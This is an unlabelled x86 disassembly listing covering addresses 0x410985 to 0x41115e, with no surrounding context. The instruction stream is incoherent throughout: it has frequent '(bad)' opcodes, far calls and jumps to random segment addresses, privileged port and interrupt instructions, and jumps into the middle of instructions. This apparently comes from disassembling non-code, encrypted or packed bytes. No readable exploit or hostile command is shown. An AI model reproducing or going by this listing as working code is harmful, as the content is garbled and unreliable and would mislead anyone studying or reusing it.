  410985:	sub    BYTE PTR ds:0xe630870f,0x79
  41098c:	imul   ebp,esp,0x1a
  41098f:	call   0x8598:0x618c8a71
  410996:	nop
  410997:	mov    ebx,0xc8d2f8c8
  41099c:	or     BYTE PTR cs:[eax],dh
  41099f:	cmp    al,0x90
  4109a1:	push   esp
  4109a2:	push   eax
  4109a3:	lahf   
  4109a4:	mov    edx,0x898bd598
  4109a9:	push   esp
  4109aa:	cmp    al,0xbb
  4109ac:	sti    
  4109ad:	mov    al,ds:0x79f1f3dc
  4109b2:	mov    bh,0x6b
  4109b4:	pop    ds
  4109b5:	cmp    esp,DWORD PTR [edi+0x15e3668c]
  4109bb:	mov    esp,0x17382ab1
  4109c0:	dec    esi
  4109c1:	mov    fs,WORD PTR [ebx+0x31]
  4109c4:	gs popa 
  4109c6:	pop    es
  4109c7:	std    
  4109c8:	inc    ecx
  4109c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109ca:	xor    edx,DWORD PTR [edx]
  4109cc:	daa    
  4109cd:	daa    
  4109ce:	sub    edx,DWORD PTR [ebx]
  4109d0:	inc    esp
  4109d1:	and    DWORD PTR [edx+0x6e],esi
  4109d4:	xlat   BYTE PTR ds:[ebx]
  4109d5:	push   ebp
  4109d6:	inc    ebp
  4109d7:	rol    BYTE PTR [ebp-0x4abbcba7],1
  4109dd:	jnp    0x410a51
  4109df:	and    eax,0x2b645722
  4109e4:	loop   0x4109ec
  4109e6:	or     ah,BYTE PTR [esi-0xd26ec4c]
  4109ec:	jb     0x410a62
  4109ee:	pop    ebp
  4109ef:	ror    DWORD PTR [ecx+0x79748c89],0x2f
  4109f6:	mov    WORD PTR [ebx-0xf5f4b6],?
  4109fc:	sbb    al,0xe4
  4109fe:	pop    ebp
  4109ff:	fs push edx
  410a01:	xchg   ebx,eax
  410a02:	pop    ebp
  410a03:	in     eax,dx
  410a04:	les    edx,FWORD PTR [eax+0x7a]
  410a07:	arpl   WORD PTR [edx+0x34f67f94],ax
  410a0d:	loop   0x410a38
  410a0f:	enter  0xf32d,0xab
  410a13:	push   esp
  410a14:	test   BYTE PTR [edx+ebp*2],bh
  410a17:	mov    bh,dl
  410a19:	int3   
  410a1a:	loopne 0x410a03
  410a1c:	fcom   QWORD PTR ds:0x251285c6
  410a22:	mov    ebp,0xa574537e
  410a27:	push   edx
  410a28:	xor    ah,BYTE PTR [edi+0x6e3ffc8]
  410a2e:	je     0x410a6e
  410a30:	jns    0x410a87
  410a32:	adc    al,0x73
  410a34:	gs scas eax,DWORD PTR es:[edi]
  410a36:	mov    eax,0x7833c974
  410a3b:	adc    eax,0x5f5fbc1e
  410a40:	popa   
  410a41:	jmp    0x4109cf
  410a43:	push   fs
  410a45:	sar    dl,1
  410a47:	pop    ebx
  410a48:	xchg   BYTE PTR [eax],bl
  410a4a:	adc    eax,0x238b72b7
  410a4f:	adc    esi,esp
  410a51:	xchg   edi,eax
  410a52:	push   0xffffffd6
  410a54:	arpl   WORD PTR [edi-0x64],bx
  410a57:	add    BYTE PTR [ecx],bh
  410a59:	and    DWORD PTR ds:0x6a93b38a,ebx
  410a5f:	mov    ebx,0x2207b987
  410a64:	push   ds
  410a65:	int    0x91
  410a67:	push   ds
  410a68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a69:	cmp    BYTE PTR [esi-0x38],0x86
  410a6d:	inc    BYTE PTR [edx-0x37]
  410a70:	stos   DWORD PTR es:[edi],eax
  410a71:	daa    
  410a72:	jmpw   0xcc7b
  410a76:	lods   al,BYTE PTR ds:[esi]
  410a77:	adc    al,bl
  410a79:	sbb    BYTE PTR [eax+0x45],dl
  410a7c:	clc    
  410a7d:	in     eax,0x61
  410a7f:	loop   0x410a39
  410a81:	fild   DWORD PTR [esp+edi*4-0x2430a642]
  410a88:	fmul   DWORD PTR [edi-0x15f37bab]
  410a8e:	(bad)  
  410a8f:	mov    ds:0x68dd539a,eax
  410a94:	es inc esp
  410a96:	xor    BYTE PTR [ebp-0x17828c06],cl
  410a9c:	jnp    0x410ad9
  410a9e:	leave  
  410a9f:	cld    
  410aa0:	xor    BYTE PTR [edi-0x19],ah
  410aa3:	jle    0x410ad2
  410aa5:	popa   
  410aa6:	fsubr  st(0),st
  410aa8:	adc    eax,eax
  410aaa:	retf   
  410aab:	or     eax,0x4b6719d4
  410ab0:	jmp    ebx
  410ab2:	fisttp DWORD PTR [ebx]
  410ab4:	sbb    DWORD PTR [ecx],ebx
  410ab6:	push   ds
  410ab7:	fbstp  TBYTE PTR [eax]
  410ab9:	in     al,0xa3
  410abb:	gs call 0x9285:0x9645a664
  410ac3:	js     0x410a72
  410ac5:	sbb    ebx,DWORD PTR [ebp-0x6f14fba6]
  410acb:	jl     0x410a98
  410acd:	repz or ch,BYTE PTR [eax-0x1297de0b]
  410ad4:	lods   eax,DWORD PTR ds:[esi]
  410ad5:	fadd   st,st(0)
  410ad7:	mov    ds:0x94317b8a,al
  410adc:	mov    ebp,eax
  410ade:	or     al,0xfb
  410ae0:	rcr    ebx,1
  410ae2:	fidivr DWORD PTR [edx+0x40948eab]
  410ae8:	push   ss
  410ae9:	inc    edi
  410aea:	mov    ecx,0x1e7f715d
  410aef:	loopne 0x410b3b
  410af1:	xchg   edi,eax
  410af2:	pop    ebx
  410af3:	clc    
  410af4:	xchg   esp,eax
  410af5:	sub    al,al
  410af7:	(bad)  
  410af8:	mov    ds:0x9decf132,eax
  410afd:	mov    eax,ds:0x4536dbe2
  410b02:	mov    al,0xfe
  410b04:	mov    al,ds:0xf5fbe05f
  410b09:	popa   
  410b0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b0b:	xor    eax,0x11caf6f1
  410b10:	stos   DWORD PTR es:[edi],eax
  410b11:	ret    
  410b12:	std    
  410b13:	and    ebp,DWORD PTR [eax-0x42]
  410b16:	jnp    0x410b1c
  410b18:	xor    eax,0xe2143656
  410b1d:	pop    ecx
  410b1e:	repnz mov gs,WORD PTR [ebx-0x756bcf3b]
  410b25:	sub    al,ch
  410b27:	xor    dl,BYTE PTR [eiz*2-0x4d0d0b9c]
  410b2e:	push   esi
  410b2f:	popa   
  410b30:	xor    DWORD PTR [esi-0x358b9abf],edx
  410b36:	xchg   edx,eax
  410b37:	data16 jns 0x410b58
  410b3a:	xchg   DWORD PTR [ecx],edi
  410b3c:	pop    ss
  410b3d:	mov    al,ds:0xec72c4f5
  410b42:	sub    BYTE PTR [edx+0x48460eb5],0xac
  410b49:	dec    esp
  410b4a:	xor    BYTE PTR [ebx+0x5c3fafab],ch
  410b50:	push   edi
  410b51:	adc    dl,BYTE PTR [ecx+0x25]
  410b54:	into   
  410b55:	loope  0x410b4f
  410b57:	xchg   esp,eax
  410b58:	xor    dh,BYTE PTR [edx]
  410b5a:	lahf   
  410b5b:	(bad)  [esi-0x3c9dcf07]
  410b61:	(bad)  
  410b62:	pop    ds
  410b63:	dec    ebp
  410b64:	mov    DWORD PTR [edx-0x66],edx
  410b67:	or     dl,BYTE PTR [esi+0x3b]
  410b6a:	push   ss
  410b6b:	scas   eax,DWORD PTR es:[edi]
  410b6c:	push   ecx
  410b6d:	push   esi
  410b6e:	pop    ds
  410b6f:	sbb    DWORD PTR [ecx+0x3f],ebp
  410b72:	test   al,0x23
  410b74:	mov    al,ds:0x52f1d8ca
  410b79:	daa    
  410b7a:	int    0xee
  410b7c:	jmp    0x410b32
  410b7e:	or     DWORD PTR [esi+ebx*8-0x1c],0xffffffdd
  410b83:	mov    dl,0x26
  410b85:	cs mov ebx,0x180f7ca8
  410b8b:	scas   eax,DWORD PTR es:[edi]
  410b8c:	daa    
  410b8d:	add    eax,esp
  410b8f:	sub    BYTE PTR [ebx-0x5a],0x24
  410b93:	or     eax,0xa81f6ec
  410b98:	(bad)  
  410b99:	out    dx,eax
  410b9a:	popf   
  410b9b:	in     eax,0x55
  410b9d:	fsubr  DWORD PTR [edx+0x33]
  410ba0:	inc    esi
  410ba1:	jp     0x410b49
  410ba3:	ja     0x410b3c
  410ba5:	cli    
  410ba6:	call   0x7ee8:0x53f94d17
  410bad:	push   ebp
  410bae:	fs repnz mov dh,0xbc
  410bb2:	fcomp  st(1)
  410bb4:	call   0xd449c62c
  410bb9:	call   0x259:0x5833b368
  410bc0:	addr16 push ebx
  410bc2:	xor    al,0xf8
  410bc4:	lds    esi,FWORD PTR [edi-0x1c]
  410bc7:	repnz push esp
  410bc9:	retf   0x8261
  410bcc:	mov    eax,0xd7c8d635
  410bd1:	jae    0x410b8e
  410bd3:	(bad)  
  410bd4:	shl    ebp,1
  410bd6:	addr16 out 0x4d,eax
  410bd9:	mov    BYTE PTR [edx+edi*2+0x4b],ah
  410bdd:	das    
  410bde:	js     0x410bfb
  410be0:	jg     0x410c4b
  410be2:	int    0xaf
  410be4:	cdq    
  410be5:	test   BYTE PTR [edi],0xb5
  410be8:	mov    BYTE PTR [edx-0xa],0x52
  410bec:	arpl   WORD PTR [edx+0x43075ce9],si
  410bf2:	int3   
  410bf3:	mov    esp,0x2edf62c1
  410bf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bf9:	pop    edi
  410bfa:	jno    0x410bc3
  410bfc:	adc    eax,0xb9e636e3
  410c01:	sbb    esp,ebp
  410c03:	es inc ecx
  410c05:	inc    ecx
  410c06:	xlat   BYTE PTR ds:[ebx]
  410c07:	lock iret 
  410c09:	pop    ecx
  410c0a:	xor    eax,0xbe43333f
  410c0f:	lods   eax,DWORD PTR ds:[esi]
  410c10:	inc    edi
  410c11:	inc    esp
  410c12:	and    eax,0x421b718
  410c17:	xchg   edx,eax
  410c18:	fistp  WORD PTR [eax+0x2cbefcd4]
  410c1e:	fxch   st(6)
  410c20:	mov    edx,0x4d1675a0
  410c25:	pmulhuw mm5,QWORD PTR [ebp+0x24]
  410c29:	out    0x78,eax
  410c2b:	jo     0x410bce
  410c2d:	xor    BYTE PTR [eax-0x1b],0xbf
  410c31:	imul   ebp,DWORD PTR [edi+0x60],0x99520511
  410c38:	push   ecx
  410c39:	or     eax,ebp
  410c3b:	cmp    BYTE PTR [ecx+0x2b93a3ec],dl
  410c41:	dec    esi
  410c42:	stc    
  410c43:	push   ebx
  410c44:	(bad)  
  410c45:	xlat   BYTE PTR ds:[ebx]
  410c46:	ins    DWORD PTR es:[edi],dx
  410c47:	rcl    ch,0xf3
  410c4a:	outs   dx,DWORD PTR ds:[esi]
  410c4b:	es loopne 0x410c03
  410c4e:	sbb    BYTE PTR [edi+0x6db2cd5d],ch
  410c54:	mov    ah,BYTE PTR [eiz*8-0x662a878]
  410c5b:	test   BYTE PTR [ebx+0x7],dl
  410c5e:	mov    esp,0xcfb9e9c4
  410c63:	mov    WORD PTR [ebx+0x42],?
  410c66:	mov    ch,0x2
  410c68:	leave  
  410c69:	xor    BYTE PTR ds:0xe8a5c537,bh
  410c6f:	pop    esp
  410c70:	imul   ebp,DWORD PTR [edi-0x6c128345],0xe2e0ed71
  410c7a:	add    dh,bl
  410c7c:	fwait
  410c7d:	mov    dl,0xf8
  410c7f:	mov    BYTE PTR [edi-0x7ae5aba1],al
  410c85:	push   edi
  410c86:	outs   dx,DWORD PTR ds:[esi]
  410c87:	fcmovu st,st(2)
  410c89:	inc    ecx
  410c8a:	pop    ebx
  410c8b:	xlat   BYTE PTR ds:[ebx]
  410c8c:	mov    bl,0x16
  410c8e:	rcr    ecx,0xf1
  410c91:	pop    ds
  410c92:	jmp    0x1a05445
  410c97:	ja     0xcbf282ea
  410c9d:	rol    bh,cl
  410c9f:	push   ss
  410ca0:	mov    ch,0x20
  410ca2:	and    esp,DWORD PTR [ebx]
  410ca4:	cli    
  410ca5:	pop    ecx
  410ca6:	lock retf 
  410ca8:	push   es
  410ca9:	sbb    DWORD PTR [ecx],edx
  410cab:	sbb    eax,0x7bcd6cd6
  410cb0:	call   FWORD PTR [edx+0x65]
  410cb3:	jmp    0xd1a14122
  410cb8:	dec    edx
  410cb9:	pop    ds
  410cba:	xlat   BYTE PTR ds:[ebx]
  410cbb:	sub    al,0x8f
  410cbd:	or     bl,BYTE PTR [ecx+0x5eda677d]
  410cc3:	sbb    ecx,DWORD PTR [edi-0x6e3e072a]
  410cc9:	mov    ch,0x7d
  410ccb:	push   0x5d74c648
  410cd0:	(bad)  
  410cd1:	in     eax,dx
  410cd2:	stos   DWORD PTR es:[edi],eax
  410cd3:	popa   
  410cd4:	shl    BYTE PTR [eax+0x76e3c417],cl
  410cda:	mov    ds:0x726cb399,eax
  410cdf:	sbb    DWORD PTR [eax],0x81bf4c52
  410ce5:	add    eax,0x8b6e5633
  410cea:	mov    esp,0xd48a2fb6
  410cef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410cf0:	cwde   
  410cf1:	leave  
  410cf2:	aaa    
  410cf3:	stc    
  410cf4:	adc    DWORD PTR [ecx+0x74],0x7
  410cf8:	jmp    0x76758a0d
  410cfd:	out    dx,al
  410cfe:	out    0x27,al
  410d00:	clc    
  410d01:	cdq    
  410d02:	aam    0x1a
  410d04:	(bad)  
  410d05:	rcr    al,cl
  410d07:	ins    BYTE PTR es:[edi],dx
  410d08:	mov    edx,0x351018e6
  410d0d:	xor    ah,BYTE PTR [edx+0x1e]
  410d10:	inc    edx
  410d11:	sbb    BYTE PTR [ebp-0x74],dh
  410d14:	dec    ecx
  410d15:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410d16:	ss push 0x23ed17cd
  410d1c:	and    BYTE PTR [eax+0x58],0x46
  410d20:	int    0x4c
  410d22:	cmp    ch,cl
  410d24:	retf   
  410d25:	cmp    al,0x93
  410d27:	scas   eax,DWORD PTR es:[edi]
  410d28:	sbb    dl,ch
  410d2a:	cmp    bh,bl
  410d2c:	mov    edx,0x24e7953e
  410d31:	ja     0x410dac
  410d33:	aad    0x2e
  410d35:	sub    ecx,0x26
  410d38:	mov    esp,0xc7032bbf
  410d3d:	mov    BYTE PTR [edx-0x20],cl
  410d40:	sar    BYTE PTR [ecx-0x4249472f],0xa8
  410d47:	sbb    esi,ebp
  410d49:	addr16 mov ecx,0x243e8d65
  410d4f:	and    dl,ah
  410d51:	mov    bh,0x55
  410d53:	mov    WORD PTR ds:0xbe39e9f6,?
  410d59:	xor    esi,DWORD PTR [eax-0x53]
  410d5c:	and    eax,0x7de73d74
  410d61:	shl    BYTE PTR [ecx],0x7d
  410d64:	aad    0x2f
  410d66:	mov    bl,0xb7
  410d68:	(bad)  
  410d69:	fdivr  st(3),st
  410d6b:	jmp    0x5ad6dc65
  410d70:	push   ds
  410d71:	test   eax,0xb52f6d6a
  410d76:	mov    edi,0x46517eb6
  410d7b:	aad    0x66
  410d7d:	jecxz  0x410db3
  410d7f:	push   ds
  410d80:	shl    DWORD PTR [di+0x18],1
  410d84:	aam    0x73
  410d86:	dec    ebx
  410d87:	(bad)  
  410d89:	dec    eax
  410d8a:	dec    ebx
  410d8c:	dec    edi
  410d8d:	retf   
  410d8e:	clc    
  410d8f:	xchg   ebp,eax
  410d90:	adc    bl,BYTE PTR [eax]
  410d92:	inc    ebp
  410d93:	ins    DWORD PTR es:[edi],dx
  410d94:	inc    esp
  410d95:	pop    ds
  410d96:	dec    ebp
  410d97:	cs stos BYTE PTR es:[edi],al
  410d99:	jl     0x410d4a
  410d9b:	pop    ebp
  410d9c:	add    bh,dh
  410d9e:	dec    edx
  410d9f:	add    eax,0x910bf920
  410da4:	retf   0xb594
  410da7:	cmc    
  410da8:	jnp    0x410de3
  410daa:	xor    eax,0x4843e61b
  410daf:	(bad)  
  410db1:	mov    eax,ds:0xff6a0e39
  410db6:	loopne 0x410e35
  410db8:	and    al,0xf7
  410dba:	dec    eax
  410dbb:	mov    cs,WORD PTR [esi+edx*1]
  410dbe:	sbb    esi,DWORD PTR [esi+0x3f]
  410dc1:	or     ch,BYTE PTR [ecx]
  410dc3:	jns    0x410db4
  410dc5:	popf   
  410dc6:	cmp    al,0x43
  410dc8:	push   0x2
  410dca:	cli    
  410dcb:	xchg   dh,dl
  410dcd:	imul   ebp,DWORD PTR [esi-0x60bcde65],0x3fd848e0
  410dd7:	xchg   edi,eax
  410dd8:	jnp    0x410e01
  410dda:	loope  0x410e50
  410ddc:	sti    
  410ddd:	sbb    bl,BYTE PTR [edi-0x772a238d]
  410de3:	pushw  es
  410de5:	test   DWORD PTR [ecx-0x5096f872],esp
  410deb:	xor    ecx,ecx
  410ded:	adc    BYTE PTR [eax-0x50ac16e2],dh
  410df3:	or     eax,DWORD PTR [edi]
  410df5:	adc    ch,BYTE PTR ss:[edx+0x7f]
  410df9:	pop    eax
  410dfa:	dec    ebx
  410dfb:	cld    
  410dfc:	aaa    
  410dfd:	sbb    ecx,DWORD PTR [ebx+eax*4]
  410e00:	and    al,0xa0
  410e02:	mov    ah,0x69
  410e04:	in     eax,0x15
  410e06:	pop    ecx
  410e07:	inc    eax
  410e08:	add    al,0x6a
  410e0a:	(bad)  
  410e0b:	pop    esi
  410e0c:	shr    DWORD PTR [edi+ebp*4+0x315bb1f2],0x5c
  410e14:	fadd   QWORD PTR [ebx+0x1e0c8500]
  410e1a:	sbb    eax,0x855a0dc8
  410e1f:	or     BYTE PTR [esi-0x5198560c],al
  410e25:	xchg   BYTE PTR [edi],cl
  410e27:	into   
  410e28:	adc    BYTE PTR [ebx-0x56],dl
  410e2b:	(bad)  
  410e2c:	and    eax,0x46f91967
  410e31:	test   BYTE PTR [ebx+0x3b],dh
  410e34:	push   cs
  410e35:	int    0xd
  410e37:	mov    ebx,0x1da1e09a
  410e3c:	or     eax,0x879056a2
  410e41:	cmp    ebp,DWORD PTR [ebp-0x1e]
  410e44:	loopne 0x410de7
  410e46:	out    0xba,eax
  410e48:	mov    DWORD PTR ds:0xd25e1e18,ebp
  410e4e:	popa   
  410e4f:	in     eax,dx
  410e50:	add    al,0x72
  410e52:	push   ecx
  410e53:	fist   WORD PTR [ecx]
  410e55:	loope  0x410e0e
  410e57:	mov    ecx,0x5919f843
  410e5c:	stc    
  410e5d:	inc    ebx
  410e5e:	and    DWORD PTR [ebx],esi
  410e60:	pop    ss
  410e61:	bound  eax,QWORD PTR [eax+0x1750a4fc]
  410e67:	mov    esi,0xf5b36b27
  410e6c:	je     0x410e89
  410e6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e6f:	jmp    0x604d:0x886f36ec
  410e76:	sbb    al,0x80
  410e78:	push   esi
  410e79:	bound  edi,QWORD PTR [edi]
  410e7b:	xor    eax,0x7bdb945d
  410e80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e81:	cmp    BYTE PTR [edx+0x49b28f6],dl
  410e87:	xor    al,0xec
  410e89:	repnz xor ecx,edx
  410e8c:	mov    edi,0xd69852dd
  410e91:	stc    
  410e92:	pop    ecx
  410e93:	add    BYTE PTR [edi+0x18],dh
  410e96:	inc    edi
  410e97:	xlat   BYTE PTR ds:[ebx]
  410e98:	lock shl ch,1
  410e9b:	pop    ecx
  410e9c:	inc    esi
  410e9d:	xchg   ecx,eax
  410e9e:	xchg   ebx,eax
  410e9f:	inc    edx
  410ea0:	dec    edi
  410ea1:	jbe    0x410ec4
  410ea3:	cdq    
  410ea4:	cld    
  410ea5:	xor    bl,BYTE PTR [eax]
  410ea7:	dec    edi
  410ea8:	cmp    ah,al
  410eaa:	test   al,0xfb
  410eac:	into   
  410ead:	imul   ebx,DWORD PTR [esi+ebp*2-0x3d],0x3f
  410eb2:	add    eax,0x1695152c
  410eb7:	clc    
  410eb8:	mov    edi,0xcc2ff0b6
  410ebd:	or     eax,0x7f6a93f0
  410ec2:	in     eax,dx
  410ec3:	xor    al,0xd8
  410ec5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ec6:	push   ebx
  410ec7:	or     ebp,DWORD PTR [ebp-0x43]
  410eca:	pop    eax
  410ecb:	std    
  410ecc:	frstor [edx]
  410ece:	xor    DWORD PTR [ebx],ecx
  410ed0:	cmc    
  410ed1:	js     0x410edc
  410ed3:	in     eax,dx
  410ed4:	mov    al,0x9
  410ed6:	push   esi
  410ed7:	pusha  
  410ed8:	push   ss
  410ed9:	and    BYTE PTR [eax],ah
  410edb:	nop
  410edc:	push   esp
  410edd:	mov    eax,0xa83f090b
  410ee2:	push   ebx
  410ee3:	jmp    0x410f4e
  410ee5:	sbb    eax,0xa4269d30
  410eea:	das    
  410eeb:	dec    ebp
  410eec:	out    dx,eax
  410eed:	mov    ds:0x570544a,al
  410ef2:	ja     0x410eed
  410ef4:	and    eax,0x4c1bfae7
  410ef9:	(bad)  
  410efb:	scas   eax,DWORD PTR es:[edi]
  410efc:	pushf  
  410efd:	fs (bad) 
  410eff:	cld    
  410f00:	pop    ebp
  410f01:	imul   esi,DWORD PTR [ebx+0x59],0x24bac373
  410f08:	push   0x69
  410f0a:	shl    BYTE PTR [ebx],1
  410f0c:	jne    0x410f65
  410f0e:	cdq    
  410f0f:	inc    esp
  410f10:	scas   al,BYTE PTR es:[edi]
  410f11:	cmp    BYTE PTR [ebp+0x1852811],0x80
  410f18:	or     al,0xb7
  410f1a:	js     0x410f05
  410f1c:	jnp    0x410f05
  410f1e:	stc    
  410f1f:	jmp    0xbf76:0xceb406d2
  410f26:	call   0x8fe3:0x6185791f
  410f2d:	push   es
  410f2e:	pop    ebp
  410f2f:	sbb    BYTE PTR [edi-0x51],0xfd
  410f33:	cmp    eax,0x7caff060
  410f38:	lea    ebx,[eax]
  410f3a:	sbb    eax,0xb2fe473
  410f3f:	dec    edi
  410f40:	mul    BYTE PTR [ebp+0x3dcbe369]
  410f46:	out    dx,al
  410f47:	jl     0x410f0c
  410f49:	mov    ds:0x66090755,al
  410f4e:	pop    edx
  410f4f:	push   ds
  410f50:	sbb    eax,DWORD PTR [edx+eiz*8-0x42]
  410f54:	and    al,0x23
  410f56:	retf   0x46a8
  410f59:	push   eax
  410f5a:	ins    BYTE PTR es:[edi],dx
  410f5b:	bound  edi,QWORD PTR [edi-0x1e]
  410f5e:	or     eax,0x28a1cedb
  410f63:	and    al,0xa3
  410f65:	loopne 0x410f7d
  410f67:	sbb    eax,0x357da932
  410f6c:	sbb    dh,BYTE PTR ds:0x119061ff
  410f72:	ror    DWORD PTR [edx-0x91d4ca6],1
  410f78:	jnp    0x410fe4
  410f7a:	dec    eax
  410f7b:	mov    DWORD PTR [eax-0x6b],edx
  410f7e:	inc    eax
  410f7f:	mov    ch,0x56
  410f81:	js     0x410f93
  410f83:	addr16 inc ebx
  410f85:	cdq    
  410f86:	pop    eax
  410f87:	int    0xb3
  410f89:	retf   0x1b01
  410f8c:	bound  ecx,QWORD PTR [esi]
  410f8e:	jg     0x410fe9
  410f90:	cmp    BYTE PTR [edi-0x39],0x73
  410f94:	pop    ebp
  410f95:	inc    edx
  410f96:	add    bh,BYTE PTR [edx-0xc]
  410f99:	jns    0x410f72
  410f9b:	and    al,0x54
  410f9d:	retf   0xaf74
  410fa0:	mov    al,0xf
  410fa2:	ret    0x81b8
  410fa5:	aam    0x45
  410fa7:	data16 fwait
  410fa9:	out    0xe,eax
  410fab:	popf   
  410fac:	and    dl,dh
  410fae:	ror    dl,1
  410fb0:	mul    BYTE PTR [ebx]
  410fb2:	sub    BYTE PTR [edx],bl
  410fb4:	inc    edx
  410fb5:	and    esi,DWORD PTR [edi+0x20]
  410fb8:	jecxz  0x411007
  410fba:	cmp    BYTE PTR [ecx+ebx*1],dl
  410fbd:	jae    0x410fa2
  410fbf:	popa   
  410fc0:	jmp    0xafb9:0xd0f71fa4
  410fc7:	jne    0x410fc6
  410fc9:	mov    dh,0xeb
  410fcb:	cmp    eax,eax
  410fcd:	pop    esi
  410fce:	ret    0x3a06
  410fd1:	inc    edx
  410fd2:	mov    ch,0x0
  410fd4:	clc    
  410fd5:	out    dx,eax
  410fd6:	leave  
  410fd7:	push   ds
  410fd8:	out    dx,al
  410fd9:	inc    edx
  410fda:	popf   
  410fdb:	icebp  
  410fdc:	outs   dx,BYTE PTR ds:[esi]
  410fdd:	mov    dh,0xf
  410fdf:	dec    eax
  410fe0:	je     0x410f6b
  410fe2:	cmp    eax,0xb4c48963
  410fe7:	mov    ah,0x34
  410fe9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410fea:	jb     0x410f70
  410fec:	aaa    
  410fed:	jecxz  0x410fec
  410fef:	mov    cl,0x56
  410ff1:	inc    esi
  410ff2:	repz jmp 0xe0445678
  410ff8:	in     eax,dx
  410ff9:	dec    edx
  410ffa:	dec    edi
  410ffb:	jmp    0x411048
  410ffd:	js     0x411022
  410fff:	cmc    
  411000:	inc    esp
  411001:	test   al,0x29
  411003:	stos   BYTE PTR es:[edi],al
  411004:	pop    esp
  411005:	inc    eax
  411006:	loope  0x410fcb
  411008:	jb     0x410fc3
  41100a:	and    bh,BYTE PTR [ebp+0x36]
  41100d:	repnz mov dh,0x1e
  411010:	stc    
  411011:	inc    eax
  411012:	mov    al,0xc8
  411014:	loope  0x411029
  411016:	cdq    
  411017:	out    dx,eax
  411018:	stos   BYTE PTR es:[edi],al
  411019:	push   ecx
  41101a:	jp     0x411065
  41101c:	or     BYTE PTR ds:0x6720af9a,bh
  411022:	(bad)  
  411023:	ja     0x411063
  411025:	or     esp,DWORD PTR [esi-0x7a]
  411028:	adc    eax,DWORD PTR [ecx]
  41102a:	dec    ebp
  41102b:	(bad)  
  41102d:	mov    ebx,0xa35de155
  411032:	lahf   
  411033:	add    al,0xd0
  411035:	jg     0x410fe9
  411037:	pop    es
  411038:	pushf  
  411039:	lea    ecx,[esi+0x4a9c6dcb]
  41103f:	push   es
  411040:	dec    esi
  411041:	outs   dx,BYTE PTR ds:[esi]
  411042:	pop    eax
  411043:	out    dx,eax
  411044:	xor    DWORD PTR [edx+0x592af0d5],edx
  41104a:	test   cl,cl
  41104c:	mov    ds:0xf0473262,al
  411051:	mov    ebx,0xef3320b2
  411056:	aas    
  411057:	mov    WORD PTR [eax-0x1b7a240b],cs
  41105d:	sub    ecx,edi
  41105f:	adc    edx,DWORD PTR [eax-0x2c197227]
  411065:	push   ebp
  411066:	scas   al,BYTE PTR es:[edi]
  411067:	xor    BYTE PTR [esi-0x77e1fece],0x3f
  41106e:	dec    ebp
  41106f:	and    esp,DWORD PTR [ebp+0x19]
  411072:	push   eax
  411073:	pop    edx
  411074:	pop    es
  411075:	push   cs
  411076:	shl    BYTE PTR [esi+0x7a095865],1
  41107c:	ficom  WORD PTR [ebx+esi*8]
  41107f:	jg     0x4110cd
  411081:	inc    BYTE PTR [ebx-0xaee671f]
  411087:	sub    esi,ebx
  411089:	neg    BYTE PTR [esi-0x3480597f]
  41108f:	mov    es,ecx
  411091:	inc    eax
  411092:	stos   DWORD PTR es:[edi],eax
  411093:	pop    edi
  411094:	mov    ds:0xf83c90fa,al
  41109a:	test   BYTE PTR [eax+0x2964ac48],dh
  4110a0:	xchg   esp,eax
  4110a1:	stos   DWORD PTR es:[edi],eax
  4110a2:	cwde   
  4110a3:	xchg   ebx,eax
  4110a4:	int    0x77
  4110a6:	in     eax,dx
  4110a7:	call   0xac56:0xa8a86259
  4110ae:	inc    eax
  4110af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110b0:	adc    DWORD PTR [ecx+0x4267a771],esp
  4110b6:	jns    0x411091
  4110b8:	inc    ebp
  4110b9:	jno    0x411050
  4110bb:	ret    0xbd59
  4110be:	mov    dh,0xaf
  4110c0:	jb     0x41112e
  4110c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110c3:	sbb    DWORD PTR [esi-0x24],edi
  4110c6:	cmp    edi,ebp
  4110c8:	mov    ch,0xdd
  4110ca:	push   0x4118f959
  4110cf:	push   eax
  4110d0:	mov    ch,0x48
  4110d2:	les    ebx,FWORD PTR [esi]
  4110d4:	ror    DWORD PTR [edi+0x32c780a1],0x5c
  4110db:	adc    BYTE PTR [esi+0x5a4c2357],al
  4110e1:	aaa    
  4110e2:	and    DWORD PTR [edx],eax
  4110e4:	lods   eax,DWORD PTR ds:[esi]
  4110e5:	ret    
  4110e6:	jae    0x411088
  4110e8:	leave  
  4110e9:	aas    
  4110ea:	jg     0x41114d
  4110ec:	xor    DWORD PTR [edi-0x78534a45],eax
  4110f2:	outs   dx,BYTE PTR ds:[esi]
  4110f3:	ficomp WORD PTR [ebx+0x3fd4400f]
  4110f9:	fisub  DWORD PTR [ecx-0x1c5aa4e7]
  4110ff:	or     BYTE PTR [ebp+0x7],0x95
  411103:	or     cl,BYTE PTR [esp+ebp*8+0x58]
  411107:	bound  ebx,QWORD PTR [eax-0x6fe5943]
  41110d:	mov    ebx,0x2d615b29
  411112:	int3   
  411113:	(bad)  
  411114:	test   al,0x6e
  411116:	sub    eax,0x253bb4c4
  41111b:	data16 in al,0xc
  41111e:	and    bh,ch
  411120:	push   ecx
  411121:	add    ah,BYTE PTR [ecx+0x22110f12]
  411127:	cmp    DWORD PTR [edx-0x22],edx
  41112a:	jbe    0x411104
  41112c:	cdq    
  41112d:	dec    edi
  41112e:	loopne 0x41119d
  411130:	cmp    eax,0xd17b6538
  411135:	mov    ds:0x3e6dd005,eax
  41113a:	(bad)  [esi]
  41113c:	adc    ebx,esi
  41113e:	mov    dl,0x28
  411140:	or     al,0x6a
  411142:	pop    ebp
  411143:	sbb    al,0x25
  411145:	adc    al,0xc4
  411147:	mov    ah,0xc4
  411149:	adc    DWORD PTR [eax+0x7f],ecx
  41114c:	adc    ch,cl
  41114e:	mov    esp,0x7abb0f1a
  411153:	push   cs
  411154:	add    al,0xe6
  411156:	push   cs
  411157:	xchg   BYTE PTR [eax+0x7d38d2e6],bl
  41115d:	inc    edx
  41115e:	pop    eax
